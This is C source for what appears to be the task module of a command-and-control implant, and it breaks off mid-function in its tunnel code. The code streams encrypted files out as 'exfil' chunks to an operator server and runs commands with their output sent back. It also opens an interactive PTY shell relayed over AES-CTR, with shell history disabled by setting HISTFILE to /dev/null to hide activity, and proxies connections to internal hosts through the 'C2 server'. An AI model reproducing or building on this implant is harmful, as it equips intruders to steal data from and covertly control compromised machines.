//
// Created by seba on 10/17/26.
//

#include "tasks.h"
#include "pack.h"

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <errno.h>
#include <limits.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <pwd.h>
#include <grp.h>
#include <time.h>
#include <ftw.h>

#include "../lib/mpack/mpack.h"
#include "miniz.h"
#include "net.h"
#include "crypt.h"
#include <pthread.h>
#include <poll.h>
#include <pty.h>
#include <sys/socket.h>
#include <openssl/evp.h>

// ---------------------------------------------------------------------------
// path helpers
// ---------------------------------------------------------------------------

static char *normalize_path(const char *rel) {
    char expanded[PATH_MAX];
    const char *input = rel;

    if (rel[0] == '~') {
        const char *home = getenv("HOME");
        if (!home) {
            struct passwd *pw = getpwuid(getuid());
            home = pw ? pw->pw_dir : "/";
        }
        snprintf(expanded, sizeof(expanded), "%s%s", home, rel + 1);
        input = expanded;
    }

    char abspath[PATH_MAX * 2];
    if (input[0] != '/') {
        char cwd[PATH_MAX];
        if (!getcwd(cwd, sizeof(cwd))) return NULL;
        snprintf(abspath, sizeof(abspath), "%s/%s", cwd, input);
    } else {
        snprintf(abspath, sizeof(abspath), "%s", input);
    }

    char *resolved = realpath(abspath, NULL);
    if (resolved) return resolved;
    return strdup(abspath);
}

// recursive mkdir
static int mkdir_all(const char *path, mode_t mode) {
    char tmp[PATH_MAX];
    snprintf(tmp, sizeof(tmp), "%s", path);
    for (char *p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = '\0';
            mkdir(tmp, mode);
            *p = '/';
        }
    }
    return (mkdir(tmp, mode) == 0 || errno == EEXIST) ? 0 : -1;
}

// recursive rm callback
static int rm_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
    (void)sb; (void)typeflag; (void)ftwbuf;
    return remove(fpath);
}

static int rm_rf(const char *path) {
    return nftw(path, rm_cb, 64, FTW_DEPTH | FTW_PHYS);
}

// copy single file preserving mode
static int copy_file(const char *src, const char *dst, mode_t mode) {
    FILE *in = fopen(src, "rb");
    if (!in) return -1;

    FILE *out = fopen(dst, "wb");
    if (!out) { fclose(in); return -1; }

    if (fchmod(fileno(out), mode) != 0) {
        fclose(in); fclose(out);
        return -1;
    }

    char buf[65536];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
        if (fwrite(buf, 1, n, out) != n) { fclose(in); fclose(out); return -1; }
    }
    int rc = ferror(in) ? -1 : 0;
    fclose(in);
    fclose(out);
    return rc;
}

// recursive directory copy
static int copy_dir(const char *src_dir, const char *dst_dir) {
    struct stat src_st;
    if (stat(src_dir, &src_st) != 0) return -1;
    if (mkdir_all(dst_dir, src_st.st_mode) != 0) return -1;

    DIR *d = opendir(src_dir);
    if (!d) return -1;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) continue;

        char sp[PATH_MAX], dp[PATH_MAX];
        snprintf(sp, sizeof(sp), "%s/%s", src_dir, ent->d_name);
        snprintf(dp, sizeof(dp), "%s/%s", dst_dir, ent->d_name);

        struct stat st;
        if (stat(sp, &st) != 0) { closedir(d); return -1; }

        int rc;
        if (S_ISDIR(st.st_mode)) rc = copy_dir(sp, dp);
        else                      rc = copy_file(sp, dp, st.st_mode);
        if (rc != 0) { closedir(d); return -1; }
    }
    closedir(d);
    return 0;
}

// ---------------------------------------------------------------------------
// zip helpers
// ---------------------------------------------------------------------------

static int zip_file_to_mem(const char *src_path, uint8_t **out, size_t *out_len) {
    mz_zip_archive zip;
    memset(&zip, 0, sizeof(zip));
    if (!mz_zip_writer_init_heap(&zip, 0, 0)) return -1;

    const char *base = strrchr(src_path, '/');
    base = base ? base + 1 : src_path;

    if (!mz_zip_writer_add_file(&zip, base, src_path, NULL, 0,
                                MZ_DEFAULT_COMPRESSION)) {
        mz_zip_writer_end(&zip);
        return -1;
    }

    void *buf = NULL;
    size_t sz = 0;
    if (!mz_zip_writer_finalize_heap_archive(&zip, &buf, &sz)) {
        mz_zip_writer_end(&zip);
        return -1;
    }
    mz_zip_writer_end(&zip);
    *out = buf;
    *out_len = sz;
    return 0;
}

static int zip_dir_walk(mz_zip_archive *zip, const char *base_dir, const char *rel_prefix) {
    DIR *d = opendir(base_dir);
    if (!d) return -1;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) continue;

        char fullpath[PATH_MAX], relpath[PATH_MAX];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", base_dir, ent->d_name);
        if (rel_prefix[0])
            snprintf(relpath, sizeof(relpath), "%s/%s", rel_prefix, ent->d_name);
        else
            snprintf(relpath, sizeof(relpath), "%s", ent->d_name);

        struct stat st;
        if (stat(fullpath, &st) != 0) { closedir(d); return -1; }

        if (S_ISDIR(st.st_mode)) {
            char direntry[PATH_MAX + 2];
            snprintf(direntry, sizeof(direntry), "%s/", relpath);
            mz_zip_writer_add_mem(zip, direntry, NULL, 0, 0);
            if (zip_dir_walk(zip, fullpath, relpath) != 0) { closedir(d); return -1; }
        } else {
            if (!mz_zip_writer_add_file(zip, relpath, fullpath, NULL, 0,
                                        MZ_DEFAULT_COMPRESSION)) {
                closedir(d); return -1;
            }
        }
    }
    closedir(d);
    return 0;
}

static int zip_dir_to_mem(const char *src_dir, uint8_t **out, size_t *out_len) {
    mz_zip_archive zip;
    memset(&zip, 0, sizeof(zip));
    if (!mz_zip_writer_init_heap(&zip, 0, 0)) return -1;

    if (zip_dir_walk(&zip, src_dir, "") != 0) {
        mz_zip_writer_end(&zip);
        return -1;
    }

    void *buf = NULL;
    size_t sz = 0;
    if (!mz_zip_writer_finalize_heap_archive(&zip, &buf, &sz)) {
        mz_zip_writer_end(&zip);
        return -1;
    }
    mz_zip_writer_end(&zip);
    *out = buf;
    *out_len = sz;
    return 0;
}

// extract a single file by name from a zip in memory
static int unzip_extract_file(const uint8_t *zip_data, size_t zip_len,
                              const char *filename,
                              uint8_t **out, size_t *out_len) {
    mz_zip_archive zip;
    memset(&zip, 0, sizeof(zip));
    if (!mz_zip_reader_init_mem(&zip, zip_data, zip_len, 0)) return -1;

    size_t sz = 0;
    void *buf = mz_zip_reader_extract_file_to_heap(&zip, filename, &sz, 0);
    mz_zip_reader_end(&zip);
    if (!buf) return -1;

    *out = buf;
    *out_len = sz;
    return 0;
}

// ---------------------------------------------------------------------------
// upload accumulator
// ---------------------------------------------------------------------------

typedef struct UploadEntry {
    char *path;
    uint8_t *data;
    size_t data_len;
    struct UploadEntry *next;
} UploadEntry;

static UploadEntry *g_uploads = NULL;

static UploadEntry *upload_find(const char *path) {
    for (UploadEntry *e = g_uploads; e; e = e->next)
        if (strcmp(e->path, path) == 0) return e;
    return NULL;
}

static void upload_remove(const char *path) {
    UploadEntry **pp = &g_uploads;
    while (*pp) {
        if (strcmp((*pp)->path, path) == 0) {
            UploadEntry *rm = *pp;
            *pp = rm->next;
            free(rm->path);
            free(rm->data);
            free(rm);
            return;
        }
        pp = &(*pp)->next;
    }
}

static void upload_store(const char *path, uint8_t *data, size_t len) {
    UploadEntry *e = malloc(sizeof(UploadEntry));
    e->path = strdup(path);
    e->data = data;
    e->data_len = len;
    e->next = g_uploads;
    g_uploads = e;
}

// ---------------------------------------------------------------------------
// download job infrastructure
// ---------------------------------------------------------------------------

static Profile  *g_profile     = NULL;
static uint8_t  *g_enc_key     = NULL;
static uint8_t  *g_session_key = NULL;
static uint32_t  g_agent_id    = 0;

void tasks_init(Profile *prof, uint8_t *enc_key, uint8_t *session_key, uint32_t agent_id) {
    g_profile     = prof;
    g_enc_key     = enc_key;
    g_session_key = session_key;
    g_agent_id    = agent_id;
}

typedef struct DownloadEntry {
    char *job_id;
    int pack_type;
    pthread_t thread;
    volatile int canceled;
    struct DownloadEntry *next;
} DownloadEntry;

static DownloadEntry *g_downloads = NULL;

static DownloadEntry *download_find(const char *job_id) {
    for (DownloadEntry *e = g_downloads; e; e = e->next)
        if (strcmp(e->job_id, job_id) == 0) return e;
    return NULL;
}

static void download_remove(const char *job_id) {
    DownloadEntry **pp = &g_downloads;
    while (*pp) {
        if (strcmp((*pp)->job_id, job_id) == 0) {
            DownloadEntry *rm = *pp;
            *pp = rm->next;
            free(rm->job_id);
            free(rm);
            return;
        }
        pp = &(*pp)->next;
    }
}

typedef struct {
    char     *job_id;
    char     *path;
    uint8_t  *content;
    size_t    content_len;
    int64_t   file_id;
    int       total_size;
    char     *address;
    int       banner_size;
    uint32_t  profile_type;
    uint8_t   enc_key[16];
    uint8_t   session_key[16];
    uint32_t  agent_id;
    volatile int *canceled;
} DownloadThreadCtx;

static void *download_thread(void *arg) {
    DownloadThreadCtx *ctx = (DownloadThreadCtx *)arg;

    // parse host:port
    char host[256] = {0};
    uint16_t port = 0;
    const char *colon = strrchr(ctx->address, ':');
    if (colon) {
        size_t hlen = (size_t)(colon - ctx->address);
        if (hlen < sizeof(host)) {
            memcpy(host, ctx->address, hlen);
            host[hlen] = '\0';
        }
        port = (uint16_t)atoi(colon + 1);
    }

    int fd = net_connect(host, port);
    if (fd < 0) goto cleanup;

    // recv banner
    if (ctx->banner_size > 0) {
        uint8_t *banner = malloc((size_t)ctx->banner_size);
        if (!banner || net_recv_exact(fd, banner, (size_t)ctx->banner_size) < 0) {
            free(banner);
            net_close(fd);
            goto cleanup;
        }
        free(banner);
    }

    // send exfil init: StartMsg{type=EXFIL_PACK, data=ExfilPack} encrypted with enc_key
    {
        uint8_t *ep = NULL; size_t ep_len = 0;
        pack_encode_exfil_pack(ctx->agent_id, ctx->profile_type, ctx->job_id, &ep, &ep_len);

        uint8_t *sm = NULL; size_t sm_len = 0;
        StartMsg smsg = { .type = EXFIL_PACK, .data = ep, .data_len = ep_len };
        pack_encode_start_msg(&smsg, &sm, &sm_len);
        free(ep);

        uint8_t *enc = NULL; size_t enc_len = 0;
        crypt_encrypt(sm, sm_len, ctx->enc_key, 16, &enc, &enc_len);
        free(sm);

        if (net_send_msg(fd, enc, (uint32_t)enc_len) < 0) {
            free(enc);
            net_close(fd);
            goto cleanup;
        }
        free(enc);
    }

    // stream chunks (1MB each)
    {
        int chunk_size = 0x100000;
        int total = (int)ctx->content_len;
        for (int i = 0; i < total; i += chunk_size) {
            int end = i + chunk_size;
            if (end > total) end = total;
            bool is_start = (i == 0);
            bool is_finish = (end == total);
            bool is_canceled = false;

            if (*ctx->canceled) {
                is_finish = true;
                is_canceled = true;
            }

            // encode AnsDownload
            uint8_t *ans = NULL; size_t ans_len = 0;
            pack_encode_ans_download((int)ctx->file_id, ctx->path, total,
                                    ctx->content + i, (size_t)(end - i),
                                    is_start, is_finish, is_canceled,
                                    &ans, &ans_len);

            // encode Job{command_id=COMMAND_DOWNLOAD, job_id=task, data=ans}
            uint8_t *job = NULL; size_t job_len = 0;
            pack_encode_job(COMMAND_DOWNLOAD, ctx->job_id, ans, ans_len, &job, &job_len);
            free(ans);

            // encode Message{type=2, object=[job]}
            Message msg = { .type = 2, .objects = &job, .object_lens = &job_len, .object_count = 1 };
            uint8_t *msg_data = NULL; size_t msg_len = 0;
            pack_encode_message(&msg, &msg_data, &msg_len);
            free(job);

            // encrypt with session key
            uint8_t *enc = NULL; size_t enc_len = 0;
            crypt_encrypt(msg_data, msg_len, ctx->session_key, 16, &enc, &enc_len);
            free(msg_data);

            net_send_msg(fd, enc, (uint32_t)enc_len);
            free(enc);

            if (is_finish) break;
            usleep(100000); // 100ms between chunks
        }
    }

    net_close(fd);

cleanup:
    download_remove(ctx->job_id);
    free(ctx->job_id);
    free(ctx->path);
    free(ctx->content);
    free(ctx->address);
    free(ctx);
    return NULL;
}

// ---------------------------------------------------------------------------
// run job infrastructure
// ---------------------------------------------------------------------------

typedef struct JobEntry {
    char *job_id;
    int pack_type;
    pthread_t thread;
    volatile int canceled;
    pid_t child_pid;
    struct JobEntry *next;
} JobEntry;

static JobEntry *g_jobs = NULL;

static JobEntry *job_find(const char *job_id) {
    for (JobEntry *e = g_jobs; e; e = e->next)
        if (strcmp(e->job_id, job_id) == 0) return e;
    return NULL;
}

static void job_remove(const char *job_id) {
    JobEntry **pp = &g_jobs;
    while (*pp) {
        if (strcmp((*pp)->job_id, job_id) == 0) {
            JobEntry *rm = *pp;
            *pp = rm->next;
            free(rm->job_id);
            free(rm);
            return;
        }
        pp = &(*pp)->next;
    }
}

typedef struct {
    char     *task;
    char     *program;
    char    **args;
    size_t    argc;
    char     *address;
    int       banner_size;
    uint32_t  profile_type;
    uint8_t   enc_key[16];
    uint8_t   session_key[16];
    uint32_t  agent_id;
    volatile int *canceled;
    pid_t    *child_pid_ptr;
} RunThreadCtx;

static void send_run_message(int fd, uint32_t cmd_id, const char *task,
                             const char *out_str, size_t out_len,
                             const char *err_str, size_t err_len,
                             int pid, bool start, bool finish,
                             const uint8_t *skey) {
    uint8_t *ans = NULL; size_t ans_len = 0;
    pack_encode_ans_run(out_str, out_len, err_str, err_len, pid, start, finish, &ans, &ans_len);

    uint8_t *job = NULL; size_t job_len = 0;
    pack_encode_job(cmd_id, task, ans, ans_len, &job, &job_len);
    free(ans);

    Message msg = { .type = 2, .objects = &job, .object_lens = &job_len, .object_count = 1 };
    uint8_t *msg_data = NULL; size_t msg_len = 0;
    pack_encode_message(&msg, &msg_data, &msg_len);
    free(job);

    uint8_t *enc = NULL; size_t enc_len = 0;
    crypt_encrypt(msg_data, msg_len, skey, 16, &enc, &enc_len);
    free(msg_data);

    net_send_msg(fd, enc, (uint32_t)enc_len);
    free(enc);
}

static void *run_thread(void *arg) {
    RunThreadCtx *ctx = (RunThreadCtx *)arg;

    // build argv: [program, args..., NULL]
    char **argv = calloc(ctx->argc + 2, sizeof(char *));
    argv[0] = ctx->program;
    for (size_t i = 0; i < ctx->argc; i++) argv[i + 1] = ctx->args[i];
    argv[ctx->argc + 1] = NULL;

    // set up stdout/stderr pipes
    int stdout_pipe[2], stderr_pipe[2];
    if (pipe(stdout_pipe) < 0 || pipe(stderr_pipe) < 0) goto cleanup_early;

    pid_t child = fork();
    if (child < 0) {
        close(stdout_pipe[0]); close(stdout_pipe[1]);
        close(stderr_pipe[0]); close(stderr_pipe[1]);
        goto cleanup_early;
    }

    if (child == 0) {
        close(stdout_pipe[0]); close(stderr_pipe[0]);
        dup2(stdout_pipe[1], STDOUT_FILENO);
        dup2(stderr_pipe[1], STDERR_FILENO);
        close(stdout_pipe[1]); close(stderr_pipe[1]);
        setsid();
        execvp(ctx->program, argv);
        _exit(127);
    }

    close(stdout_pipe[1]); close(stderr_pipe[1]);
    *ctx->child_pid_ptr = child;
    int pid = (int)child;

    // connect second TCP
    char host[256] = {0};
    uint16_t port = 0;
    const char *colon = strrchr(ctx->address, ':');
    if (colon) {
        size_t hlen = (size_t)(colon - ctx->address);
        if (hlen < sizeof(host)) { memcpy(host, ctx->address, hlen); host[hlen] = '\0'; }
        port = (uint16_t)atoi(colon + 1);
    }

    int fd = net_connect(host, port);
    if (fd < 0) { kill(child, SIGKILL); waitpid(child, NULL, 0); close(stdout_pipe[0]); close(stderr_pipe[0]); goto cleanup_early; }

    // recv banner
    if (ctx->banner_size > 0) {
        uint8_t *banner = malloc((size_t)ctx->banner_size);
        if (!banner || net_recv_exact(fd, banner, (size_t)ctx->banner_size) < 0) {
            free(banner); net_close(fd); kill(child, SIGKILL); waitpid(child, NULL, 0);
            close(stdout_pipe[0]); close(stderr_pipe[0]); goto cleanup_early;
        }
        free(banner);
    }

    // send JOB_PACK init: StartMsg{type=JOB_PACK, data=JobPack{id,type,task}} (same wire as ExfilPack)
    {
        uint8_t *jp = NULL; size_t jp_len = 0;
        pack_encode_exfil_pack(ctx->agent_id, ctx->profile_type, ctx->task, &jp, &jp_len);
        uint8_t *sm = NULL; size_t sm_len = 0;
        StartMsg smsg = { .type = JOB_PACK, .data = jp, .data_len = jp_len };
        pack_encode_start_msg(&smsg, &sm, &sm_len);
        free(jp);
        uint8_t *enc = NULL; size_t enc_len = 0;
        crypt_encrypt(sm, sm_len, ctx->enc_key, 16, &enc, &enc_len);
        free(sm);
        net_send_msg(fd, enc, (uint32_t)enc_len);
        free(enc);
    }

    // send start: AnsRun{pid, start:true}
    send_run_message(fd, COMMAND_RUN, ctx->task, "", 0, "", 0, pid, true, false, ctx->session_key);

    // streaming loop: poll stdout/stderr, send accumulated output every 1 second
    {
        size_t out_cap = 4096, out_len = 0, out_sent = 0;
        char *out_buf = malloc(out_cap);
        size_t err_cap = 4096, err_len = 0, err_sent = 0;
        char *err_buf = malloc(err_cap);

        int stdout_open = 1, stderr_open = 1;
        const int max_chunk = 0x10000; // 64KB

        while ((stdout_open || stderr_open) && !*ctx->canceled) {
            struct pollfd fds[2];
            int nfds = 0;
            int so_idx = -1, se_idx = -1;
            if (stdout_open) { so_idx = nfds; fds[nfds].fd = stdout_pipe[0]; fds[nfds].events = POLLIN; nfds++; }
            if (stderr_open) { se_idx = nfds; fds[nfds].fd = stderr_pipe[0]; fds[nfds].events = POLLIN; nfds++; }

            poll(fds, (nfds_t)nfds, 1000);

            // read available data
            if (so_idx >= 0 && (fds[so_idx].revents & (POLLIN | POLLHUP))) {
                char tmp[2048];
                ssize_t n = read(stdout_pipe[0], tmp, sizeof(tmp));
                if (n > 0) {
                    while (out_len + (size_t)n > out_cap) { out_cap *= 2; out_buf = realloc(out_buf, out_cap); }
                    memcpy(out_buf + out_len, tmp, (size_t)n);
                    out_len += (size_t)n;
                } else { stdout_open = 0; }
            }
            if (se_idx >= 0 && (fds[se_idx].revents & (POLLIN | POLLHUP))) {
                char tmp[2048];
                ssize_t n = read(stderr_pipe[0], tmp, sizeof(tmp));
                if (n > 0) {
                    while (err_len + (size_t)n > err_cap) { err_cap *= 2; err_buf = realloc(err_buf, err_cap); }
                    memcpy(err_buf + err_len, tmp, (size_t)n);
                    err_len += (size_t)n;
                } else { stderr_open = 0; }
            }

            // send new data in chunks
            int has_out = (out_len > out_sent);
            int has_err = (err_len > err_sent);
            if (has_out || has_err) {
                const char *o = NULL; size_t ol = 0;
                const char *e = NULL; size_t el = 0;

                if (has_out) {
                    ol = out_len - out_sent;
                    if ((int)ol > max_chunk) ol = (size_t)max_chunk;
                    o = out_buf + out_sent;
                    out_sent += ol;
                }
                if (has_err) {
                    el = err_len - err_sent;
                    if ((int)el > max_chunk) el = (size_t)max_chunk;
                    e = err_buf + err_sent;
                    err_sent += el;
                }

                send_run_message(fd, COMMAND_RUN, ctx->task, o, ol, e, el, pid, false, false, ctx->session_key);
            }
        }

        // wait for child
        waitpid(child, NULL, 0);
        close(stdout_pipe[0]); close(stderr_pipe[0]);

        // drain remaining output
        while (out_sent < out_len || err_sent < err_len) {
            const char *o = NULL; size_t ol = 0;
            const char *e = NULL; size_t el = 0;

            if (out_sent < out_len) {
                ol = out_len - out_sent;
                if ((int)ol > max_chunk) ol = (size_t)max_chunk;
                o = out_buf + out_sent;
                out_sent += ol;
            }
            if (err_sent < err_len) {
                el = err_len - err_sent;
                if ((int)el > max_chunk) el = (size_t)max_chunk;
                e = err_buf + err_sent;
                err_sent += el;
            }

            send_run_message(fd, COMMAND_RUN, ctx->task, o, ol, e, el, pid, false, false, ctx->session_key);

            if (out_sent < out_len || err_sent < err_len) usleep(100000);
        }

        // send finish
        send_run_message(fd, COMMAND_RUN, ctx->task, "", 0, "", 0, pid, false, true, ctx->session_key);

        free(out_buf);
        free(err_buf);
    }

    net_close(fd);

cleanup_early:
    job_remove(ctx->task);
    free(argv);
    free(ctx->task);
    free(ctx->program);
    for (size_t i = 0; i < ctx->argc; i++) free(ctx->args[i]);
    free(ctx->args);
    free(ctx->address);
    free(ctx);
    return NULL;
}

// ---------------------------------------------------------------------------
// terminal infrastructure
// ---------------------------------------------------------------------------

typedef struct TerminalEntry {
    int term_id;
    volatile int canceled;
    pid_t child_pid;
    int pty_fd;
    int sock_fd;
    struct TerminalEntry *next;
} TerminalEntry;

static TerminalEntry *g_terminals = NULL;

static TerminalEntry *terminal_find(int term_id) {
    for (TerminalEntry *e = g_terminals; e; e = e->next)
        if (e->term_id == term_id) return e;
    return NULL;
}

static void terminal_remove(int term_id) {
    TerminalEntry **pp = &g_terminals;
    while (*pp) {
        if ((*pp)->term_id == term_id) {
            TerminalEntry *rm = *pp;
            *pp = rm->next;
            free(rm);
            return;
        }
        pp = &(*pp)->next;
    }
}

typedef struct {
    int term_id;
    char *program;
    int height;
    int width;
    char *address;
    int banner_size;
    uint32_t profile_type;
    uint8_t enc_key[16];
    uint32_t agent_id;
    TerminalEntry *entry;
} TerminalThreadCtx;

typedef struct {
    int src_fd;
    int dst_fd;
    EVP_CIPHER_CTX *ctx;
    volatile int *canceled;
} RelayCtx;

static void *relay_decrypt_to_pty(void *arg) {
    RelayCtx *r = (RelayCtx *)arg;
    uint8_t buf[4096], out[4096 + EVP_MAX_BLOCK_LENGTH];
    while (!*r->canceled) {
        ssize_t n = read(r->src_fd, buf, sizeof(buf));
        if (n <= 0) break;
        int outlen = 0;
        EVP_EncryptUpdate(r->ctx, out, &outlen, buf, (int)n);
        if (outlen > 0) {
            if (write(r->dst_fd, out, (size_t)outlen) <= 0) break;
        }
    }
    return NULL;
}

static void *relay_pty_to_encrypt(void *arg) {
    RelayCtx *r = (RelayCtx *)arg;
    uint8_t buf[4096], out[4096 + EVP_MAX_BLOCK_LENGTH];
    while (!*r->canceled) {
        ssize_t n = read(r->src_fd, buf, sizeof(buf));
        if (n <= 0) break;
        int outlen = 0;
        EVP_EncryptUpdate(r->ctx, out, &outlen, buf, (int)n);
        if (outlen > 0) {
            if (write(r->dst_fd, out, (size_t)outlen) <= 0) break;
        }
    }
    return NULL;
}

static void *terminal_thread(void *arg) {
    TerminalThreadCtx *tctx = (TerminalThreadCtx *)arg;
    TerminalEntry *entry = tctx->entry;
    int alive = 1;
    char *status_msg = "";

    // fork with PTY
    struct winsize ws = { .ws_row = (unsigned short)tctx->height, .ws_col = (unsigned short)tctx->width };
    int pty_fd = -1;
    pid_t child = forkpty(&pty_fd, NULL, NULL, &ws);
    if (child < 0) {
        alive = 0;
        status_msg = "forkpty failed";
    } else if (child == 0) {
        // child: set env and exec
        setenv("HISTORY", "", 1);
        setenv("HISTSIZE", "0", 1);
        setenv("HISTSAVE", "", 1);
        setenv("HISTZONE", "", 1);
        setenv("HISTLOG", "", 1);
        setenv("HISTFILE", "/dev/null", 1);
        setenv("HISTFILESIZE", "0", 1);
        setenv("TERM", "xterm-256color", 1);
        execlp(tctx->program, tctx->program, (char *)NULL);
        _exit(127);
    }

    if (alive) {
        entry->child_pid = child;
        entry->pty_fd = pty_fd;
    }

    // connect second TCP
    char host[256] = {0};
    uint16_t port = 0;
    const char *colon = strrchr(tctx->address, ':');
    if (colon) {
        size_t hlen = (size_t)(colon - tctx->address);
        if (hlen < sizeof(host)) { memcpy(host, tctx->address, hlen); host[hlen] = '\0'; }
        port = (uint16_t)atoi(colon + 1);
    }

    int sock_fd = net_connect(host, port);
    if (sock_fd < 0) {
        if (alive) { close(pty_fd); kill(child, SIGKILL); waitpid(child, NULL, 0); }
        goto term_cleanup;
    }
    entry->sock_fd = sock_fd;

    // recv banner
    if (tctx->banner_size > 0) {
        uint8_t *banner = malloc((size_t)tctx->banner_size);
        if (!banner || net_recv_exact(sock_fd, banner, (size_t)tctx->banner_size) < 0) {
            free(banner); net_close(sock_fd);
            if (alive) { close(pty_fd); kill(child, SIGKILL); waitpid(child, NULL, 0); }
            goto term_cleanup;
        }
        free(banner);
    }

    // generate AES-CTR key+iv
    uint8_t tun_key[16], tun_iv[16];
    crypt_random(tun_key, 16);
    crypt_random(tun_iv, 16);

    // send TermPack init
    {
        uint8_t *tp = NULL; size_t tp_len = 0;
        pack_encode_term_pack(tctx->agent_id, tctx->term_id, tun_key, tun_iv, alive, status_msg, &tp, &tp_len);
        uint8_t *sm = NULL; size_t sm_len = 0;
        StartMsg smsg = { .type = TERMINAL_PACK, .data = tp, .data_len = tp_len };
        pack_encode_start_msg(&smsg, &sm, &sm_len);
        free(tp);
        uint8_t *enc = NULL; size_t enc_len = 0;
        crypt_encrypt(sm, sm_len, tctx->enc_key, 16, &enc, &enc_len);
        free(sm);
        net_send_msg(sock_fd, enc, (uint32_t)enc_len);
        free(enc);
    }

    if (!alive) {
        net_close(sock_fd);
        goto term_cleanup;
    }

    // set up AES-CTR stream ciphers
    EVP_CIPHER_CTX *enc_ctx = EVP_CIPHER_CTX_new();
    EVP_CIPHER_CTX *dec_ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(enc_ctx, EVP_aes_128_ctr(), NULL, tun_key, tun_iv);
    EVP_EncryptInit_ex(dec_ctx, EVP_aes_128_ctr(), NULL, tun_key, tun_iv);

    // relay threads: server→PTY (decrypt) and PTY→server (encrypt)
    RelayCtx r_dec = { .src_fd = sock_fd, .dst_fd = pty_fd, .ctx = dec_ctx, .canceled = &entry->canceled };
    RelayCtx r_enc = { .src_fd = pty_fd, .dst_fd = sock_fd, .ctx = enc_ctx, .canceled = &entry->canceled };

    pthread_t t_dec, t_enc;
    pthread_create(&t_dec, NULL, relay_decrypt_to_pty, &r_dec);
    pthread_create(&t_enc, NULL, relay_pty_to_encrypt, &r_enc);

    // wait for cancel or relay exit
    pthread_join(t_dec, NULL);
    pthread_join(t_enc, NULL);

    usleep(200000);
    close(pty_fd);
    if (kill(child, 0) == 0) kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    net_close(sock_fd);

    EVP_CIPHER_CTX_free(enc_ctx);
    EVP_CIPHER_CTX_free(dec_ctx);

term_cleanup:
    terminal_remove(tctx->term_id);
    free(tctx->program);
    free(tctx->address);
    free(tctx);
    return NULL;
}

// ---------------------------------------------------------------------------
// tunnel infrastructure
// ---------------------------------------------------------------------------

typedef struct TunnelEntry {
    int channel_id;
    volatile int canceled;
    volatile int paused;
    pthread_t thread;
    int client_fd;
    int sock_fd;
    struct TunnelEntry *next;
} TunnelEntry;

static TunnelEntry *g_tunnels = NULL;

static TunnelEntry *tunnel_find(int channel_id) {
    for (TunnelEntry *e = g_tunnels; e; e = e->next)
        if (e->channel_id == channel_id) return e;
    return NULL;
}

static void tunnel_remove(int channel_id) {
    TunnelEntry **pp = &g_tunnels;
    while (*pp) {
        if ((*pp)->channel_id == channel_id) {
            TunnelEntry *rm = *pp;
            *pp = rm->next;
            free(rm);
            return;
        }
        pp = &(*pp)->next;
    }
}

typedef struct {
    int channel_id;
    char *address;
    char *srv_address;
    int banner_size;
    uint32_t profile_type;
    uint8_t enc_key[16];
    uint32_t agent_id;
    TunnelEntry *entry;
} TunnelThreadCtx;

typedef struct {
    int src_fd;
    int dst_fd;
    EVP_CIPHER_CTX *ctx;
    volatile int *canceled;
    volatile int *paused;
} TunnelRelayCtx;

static void *tunnel_relay_srv_to_client(void *arg) {
    TunnelRelayCtx *r = (TunnelRelayCtx *)arg;
    uint8_t buf[32768], out[32768 + EVP_MAX_BLOCK_LENGTH];
    while (!*r->canceled) {
        ssize_t n = read(r->src_fd, buf, sizeof(buf));
        if (n <= 0) break;
        int outlen = 0;
        EVP_EncryptUpdate(r->ctx, out, &outlen, buf, (int)n);
        if (outlen > 0) {
            ssize_t w = 0;
            while (w < outlen) {
                ssize_t s = write(r->dst_fd, out + w, (size_t)(outlen - w));
                if (s <= 0) return NULL;
                w += s;
            }
        }
    }
    return NULL;
}

static void *tunnel_relay_client_to_srv(void *arg) {
    TunnelRelayCtx *r = (TunnelRelayCtx *)arg;
    uint8_t buf[32768], out[32768 + EVP_MAX_BLOCK_LENGTH];
    while (!*r->canceled) {
        if (r->paused && *r->paused) {
            usleep(50000);
            continue;
        }

        struct pollfd pfd = { .fd = r->src_fd, .events = POLLIN };
        int pr = poll(&pfd, 1, 500);
        if (*r->canceled) break;
        if (pr == 0) continue;
        if (pr < 0) break;

        ssize_t n = read(r->src_fd, buf, sizeof(buf));
        if (n <= 0) break;
        int outlen = 0;
        EVP_EncryptUpdate(r->ctx, out, &outlen, buf, (int)n);
        if (outlen > 0) {
            ssize_t w = 0;
            while (w < outlen) {
                ssize_t s = write(r->dst_fd, out + w, (size_t)(outlen - w));
                if (s <= 0) return NULL;
                w += s;
            }
        }
    }
    return NULL;
}

static void *tunnel_thread(void *arg) {
    TunnelThreadCtx *tctx = (TunnelThreadCtx *)arg;
    TunnelEntry *entry = tctx->entry;
    int active = 1;
    uint8_t reason = 0;

    // connect to target with 200ms timeout
    char tgt_host[256] = {0};
    uint16_t tgt_port = 0;
    const char *colon = strrchr(tctx->address, ':');
    if (colon) {
        size_t hlen = (size_t)(colon - tctx->address);
        if (hlen < sizeof(tgt_host)) { memcpy(tgt_host, tctx->address, hlen); tgt_host[hlen] = '\0'; }
        tgt_port = (uint16_t)atoi(colon + 1);
    }

    int reason_code = 0;
    int client_fd = net_connect_timeout(tgt_host, tgt_port, 200, &reason_code);
    if (client_fd < 0) {
        active = 0;
        reason = (uint8_t)reason_code;
    } else {
        entry->client_fd = client_fd;
    }

    // connect second TCP to C2 server
    char srv_host[256] = {0};
    uint16_t srv_port = 0;
    colon = strrchr(tctx->srv_address, ':');
    if (colon) {
        size_t hlen = (size_t)(colon - tctx->srv_address);
        if (hlen < sizeof(srv_host)) { memcpy(srv_host, tctx->srv_address, hlen); srv_host[hlen] = '\0'; }
        srv_port = (uint16_t)atoi(colon + 1);
    }

    int sock_fd = net_connect(srv_host, srv_port);
    if (sock_fd < 0) {
        if (active) net_close(client_fd);
        goto tun_cleanup;
    }
    entry->sock_fd = sock_fd;

    // recv banner
    if (tctx->banner_size > 0) {
